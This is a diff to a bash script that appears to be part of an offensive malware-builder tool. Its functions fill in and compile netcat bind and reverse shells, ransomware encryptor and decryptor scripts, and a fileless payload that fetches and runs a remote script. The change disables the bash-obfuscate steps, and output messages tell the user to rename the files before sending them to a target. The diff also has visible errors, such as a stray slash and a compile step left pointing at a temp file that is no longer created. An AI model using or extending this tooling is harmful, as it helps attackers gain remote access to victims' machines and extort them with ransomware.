@@ -850,11 +850,11 @@ netcat_shells_bind() {
 	template=$(cat "$NetcatBindShell")
 	final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo "$final_script" > netcatbindshell.temp1 # create full correct script
-    bash-obfuscate -c 2 -r netcatbindshell.temp1 -o netcatbindshell.temp2 # obfuscate script does not use bin/bash when encrypting
-	echo '#!/bin/bash' > netcatbindshell.temp3 # create new file with bin bash as first line
-    cat netcatbindshell.temp2 >> netcatbindshell.temp3 # append the encrypted script to file
-    chmod 770 netcatbindshell.temp3
-    shc -r -f netcatbindshell.temp3 -o "$Malware"/NetcatBindingShellScript # compile script
+#    bash-obfuscate -c 2 -r netcatbindshell.temp1 -o netcatbindshell.temp2 # obfuscate script does not use bin/bash when encrypting
+#	echo '#!/bin/bash' > netcatbindshell.temp3 # create new file with bin bash as first line
+#    cat netcatbindshell.temp2 >> netcatbindshell.temp3 # append the encrypted script to file
+    chmod 770 netcatbindshell.temp1
+    shc -r -f netcatbindshell.temp1 -o "$Malware"/NetcatBindingShellScript # compile script
     rm -f netcatbindshell.* "$NetcatBindShell" "$ncbo" # remove junk files
     echo -e "$c File \"NetcatBindingShellScript\" is ready and executable in the $Malware folder. \n Change the name of file before sending to target. $x"
     echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser Port $chosen_port \nProgram Used: netcat binding shell create" >> "$log/NetcatBindShell.log" # log the information for user later if needed
@@ -875,11 +875,11 @@ netcat_shells_reverse() {
 	template=$(cat "$NetcatRevShell")
 	final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo "$final_script" > netcatreverseshell.temp1 # create full correct script
-    bash-obfuscate -c 2 -r netcatreverseshell.temp1 -o netcatreverseshell.temp2 # obfuscate script does not use bin/bash when encrypting
-    echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
-    cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
-    chmod 770 netcatreverseshell.temp3
- /    shc -r -f netcatreverseshell.temp3 -o "$Malware"/NetcatReverseShellScript # compile script
+#    bash-obfuscate -c 2 -r netcatreverseshell.temp1 -o netcatreverseshell.temp2 # obfuscate script does not use bin/bash when encrypting
+#    echo '#!/bin/bash'  > netcatreverseshell.temp3 # create new file with bin bash as first line
+#    cat netcatreverseshell.temp2 >> netcatreverseshell.temp3 # append the encrypted script to file
+    chmod 770 netcatreverseshell.temp1
+    shc -r -f netcatreverseshell.temp1 -o "$Malware"/NetcatReverseShellScript # compile script
     rm -f netcatreverseshell.* "$ncro" "$NetcatRevShell" # remove junk files
     echo -e "$c File \"NetcatReverseShellScript\" is ready and executable in the $Malware folder. \nChange the name of file before sending to target. $x"
     echo -e "Date and Time: $DATE \nUser's Name: $USER \nUser IP used: $chosen_ip \nUser Port $chosen_port \nNetcat Reverse shell create" >> "$log/NetcatReverseShell.log"
@@ -902,11 +902,11 @@ rev_shells() {
 	final_script=$(echo "$template" | awk -v ip="$chosen_ip" -v port="$chosen_port" '{ gsub(/IP/, ip) ; gsub(/PORT/, port) ; print }')
     echo  "$final_script" > revshell.temp1
 	rm -f "$rvso" "$LinuxRevShell"
-	bash-obfuscate -c 2 revshell.temp1 -o revshell.temp2
-	wait
-	echo '#!/bin/bash' > revshell.temp3
-	cat revshell.temp2 >> revshell.temp3
-    chmod 770 revshell.temp3
+#	bash-obfuscate -c 2 revshell.temp1 -o revshell.temp2
+#	wait
+#	echo '#!/bin/bash' > revshell.temp3
+#	cat revshell.temp2 >> revshell.temp3
+    chmod 770 revshell.temp1
     shc -r -f revshell.temp3 -o "$Malware"/RevShell
 	wait
 	rm -f revshell.*
@@ -1048,17 +1048,17 @@ ransomware_quick_dirty() {
 	echo "$final_script" > ransom_encrypt_remote.temp1 # create a file for ransomware and decription below
 	echo "$final_script_d" > ransom_decrypt_remote.temp1
 	rm -f "$rweo" "$RansomEncrypt" "$rwdo" "$RansomDecrypt"
-	bash-obfuscate -c 2 -r ransom_encrypt_remote.temp1 -o ransom_encrypt_remote.temp2 # encrypt the script's
-	wait
-	bash-obfuscate -c 2 -r ransom_decrypt_remote.temp1 -o ransom_decrypt_remote.temp2
-	wait
-	echo '#!/bin/bash' > ransom_encrypt_remote.temp3 # get a encrypted file ready for shc - shc needs /bin/bash as 1st line
-    echo '#!/bin/bash' > ransom_decrypt_remote.temp3
-	cat ransom_encrypt_remote.temp2 >> ransom_encrypt_remote.temp3 # add content of encrypted script and decryption script below
-	cat ransom_decrypt_remote.temp2 >> ransom_decrypt_remote.temp3
-	chmod 770 ransom_encrypt_remote.temp3 ransom_decrypt_remote.temp3
-	shc -r -f ransom_encrypt_remote.temp3 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
-	shc -r -f ransom_decrypt_remote.temp3 -o "$Malware"/ransom_nice_and_clean
+#	bash-obfuscate -c 2 -r ransom_encrypt_remote.temp1 -o ransom_encrypt_remote.temp2 # encrypt the script's
+#	wait
+#	bash-obfuscate -c 2 -r ransom_decrypt_remote.temp1 -o ransom_decrypt_remote.temp2
+#	wait
+#	echo '#!/bin/bash' > ransom_encrypt_remote.temp3 # get a encrypted file ready for shc - shc needs /bin/bash as 1st line
+#   echo '#!/bin/bash' > ransom_decrypt_remote.temp3
+#	cat ransom_encrypt_remote.temp2 >> ransom_encrypt_remote.temp3 # add content of encrypted script and decryption script below
+#	cat ransom_decrypt_remote.temp2 >> ransom_decrypt_remote.temp3
+	chmod 770 ransom_encrypt_remote.temp1 ransom_decrypt_remote.temp1
+	shc -r -f ransom_encrypt_remote.temp1 -o "$Malware"/ransom_quick_and_dirty # compile both scripts
+	shc -r -f ransom_decrypt_remote.temp1 -o "$Malware"/ransom_nice_and_clean
 	rm -rf ransom_encrypt_remote.* ransom_decrypt_remote.*
 	echo -e "\n\n $c File ransom_quick_and_dirty and ransom_nice_and_clean are ready and executable in the $Malware folder. \nransom_quick-dirty.sh is the encrypting script. \nransomnice_clean is the decrypting script. $x"
 	echo -e "\n\nDate: $DATE \nUser: $USER \nPassword used for key encryption: $PASSWORD1 \nEmail used for victim respond back: $EMAIL" >> "$log/ransom_quick_dirty.log" "$log/ransom_nice_clean.log"
@@ -1107,11 +1107,11 @@ no_touch_script() {
 	script=$(echo "$template" | awk -v http="$HTTP" -v host="$HOST" -v script="$SCRIPT" '{ gsub(/HTTP/, http) ; gsub(/HOST/, host) ; gsub(/SCRIPT/, script) ; print }')
 	echo "$script" > no_touch_disk.temp1
 	rm -f "$ntso" "$NoTouchScript"
-	bash-obfuscate -c 2 -r no_touch_disk.temp1 -o no_touch_disk.temp2
-	echo '#!/bin/bash' > no_touch_disk.temp3
-	cat no_touch_disk.temp2 >> no_touch_disk.temp3
-	chmod 770 no_touch_disk.temp3
-	shc -r -f no_touch_disk.temp3 -o "$Malware"/no_touch_disk_payload
+#	bash-obfuscate -c 2 -r no_touch_disk.temp1 -o no_touch_disk.temp2
+#	echo '#!/bin/bash' > no_touch_disk.temp3
+#	cat no_touch_disk.temp2 >> no_touch_disk.temp3
+	chmod 770 no_touch_disk.temp1
+	shc -r -f no_touch_disk.temp1 -o "$Malware"/no_touch_disk_payload
 	rm -rf no_touch_disk.*
 	echo -e "\n\n $p File no_touch_disk_payload is available in the $Malware folder, change name and make executable before sending to target. $x \n"
 	echo -e "\n Date: $DATE \nUser: $USER \n Program used: in memory payload \n Target script to grab and run: $HTTP://$HOST/$SCRIPT " >> "$log/no-touch-payload"
